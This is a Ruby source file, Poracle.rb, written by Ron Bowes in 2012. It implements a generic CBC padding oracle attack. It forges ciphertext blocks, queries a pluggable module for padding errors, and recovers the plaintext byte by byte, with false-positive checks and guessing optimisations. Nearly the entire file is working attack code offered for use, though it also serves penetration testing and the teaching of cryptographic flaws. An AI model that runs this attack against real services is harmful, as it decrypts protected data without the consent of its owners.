##
# Poracle.rb
# Created: December 8, 2012
# By: Ron Bowes
#
# This class implements a simple Padding Oracle attack. It requires a 'module',
# which implements a couple simple methods:
#
# NAME
#  A constant representing the name of the module, used for output.
#
# blocksize()
#  The blocksize of whatever cipher is being used, in bytes (eg, # 16 for AES,
#  8 for DES, etc)
#
# attempt_decrypt(ciphertext)
#  Attempt to decrypt the given data, and return true if there was no
#  padding error and false if a padding error occured.
#
# See LocalTestModule.rb and RemoteTestModule.rb for examples of how this can
# be made.
##
#

require 'hex'

module Poracle
  attr_accessor :verbose

  @@guesses = 0

  def Poracle.guesses
    return @@guesses
  end

  def Poracle.ord(c)
    if(c.is_a?(Fixnum))
      return c
    end
    return c.unpack('C')[0]
  end

  def Poracle.find_character(mod, character, block, previous, plaintext, starting_character = 0, verbose = false)
    # First, generate a good C' (C prime) value, which is what we're going to
    # set the previous block to. It's the plaintext we have so far, XORed with
    # the expected padding, XORed with the previous block
    blockprime = "\0" * mod.blocksize
    (mod.blocksize - 1).step(character + 1, -1) do |i|
      blockprime[i] = (ord(plaintext[i]) ^ (mod.blocksize - character) ^ ord(previous[i])).chr
    end

    # Try all possible characters
    0.upto(255) do |i|
      # Decide what our current guess will be. This is an optimization that
      # lets us search through the more likely character space first
      current_guess = (starting_character + i) % 256

      blockprime[character] = ((mod.blocksize - character) ^ ord(previous[character]) ^ current_guess).chr

      result = mod.attempt_decrypt(blockprime + block)
      @@guesses += 1

      if(result)
        # Validate the result if we're working on the last character
        false_positive = false
        if(character == mod.blocksize - 1)
          blockprime_test = blockprime.clone
          blockprime_test[character - 1] = (ord(blockprime_test[character - 1]) ^ 1).chr
          if(!mod.attempt_decrypt(blockprime_test + block))
            puts("Hit a false positive!")
            false_positive = true
          end
        end

        if(!false_positive)
          return current_guess.chr
        end
      end
    end

    raise("Couldn't find a valid encoding!")
  end

  def Poracle.do_block(mod, block, previous, is_mostly_ascii = false, has_padding = false, verbose = false)
    result = "?" * block.length
    plaintext  = "?" * mod.blocksize

    # Loop through the string from the end to the beginning
    character = block.length - 1
    while(character >= 0) do
      # When character is below 0, we've arrived at the beginning of the string
      if(character >= block.length)
        raise("Could not decode!")
      end

      # Try to be intelligent about which character we guess first, to save
      # requests
      starting_character = 0
      if(character == block.length - 1 && has_padding)
        starting_character = 1
      elsif(has_padding && character >= block.length - plaintext[block.length - 1].ord)
        starting_character = plaintext[block.length - 1].ord
      elsif(is_mostly_ascii)
        starting_character = 0x20
      else
        starting_character = 0
      end

      c = find_character(mod, character, block, previous, plaintext, starting_character, verbose)
      plaintext[character] = c
      if(verbose)
        puts(plaintext)
      end
      character -= 1
    end

    return plaintext
  end

  def Poracle.decrypt(mod, data, iv = nil, verbose = false, is_mostly_ascii = false)
    # Default to a nil IV
    if(iv.nil?)
      iv = "\x00" * mod.blocksize
    end

    # Add the IV to the start of the encrypted string (for simplicity)
    data  = iv + data
    blockcount = data.length / mod.blocksize

    # Validate the blocksize
    if(data.length % mod.blocksize != 0)
      puts("Encrypted data isn't a multiple of the blocksize! Is this a block cipher?")
    end

    # Tell the user what's going on
    if(verbose)
      puts("> Starting Poracle decrypter with module #{mod.class::NAME}")
      puts(">> Encrypted length: %d" % data.length)
      puts(">> Blocksize: %d" % mod.blocksize)
      puts(">> %d blocks:" % blockcount)
    end

    # Split the data into blocks
    blocks = data.unpack("a#{mod.blocksize}" * blockcount)
    i = 0
    blocks.each do |b|
      i = i + 1
      if(verbose)
        puts(">>> Block #{i}: #{b.unpack("H*")}")
      end
    end

    # Decrypt all the blocks - from the last to the first (after the IV)
    result = ''
    is_last_block = true
    (blocks.size - 1).step(1, -1) do |i|
      new_result = do_block(mod, blocks[i], blocks[i - 1], is_mostly_ascii, is_last_block, verbose)
      if(new_result.nil?)
        return nil
      end
      is_last_block = false
      result = new_result + result
      if(verbose)
        puts(" --> #{result}")
      end
    end

    # Validate and remove the padding
    pad_bytes = result[result.length - 1].chr
    if(result[result.length - ord(pad_bytes), result.length - 1] != pad_bytes * ord(pad_bytes))
      puts("Bad padding:")
      puts(Hex.get_str(result))
      return nil
    end

    result = result[0, result.length - ord(pad_bytes)]

    return result
  end
end
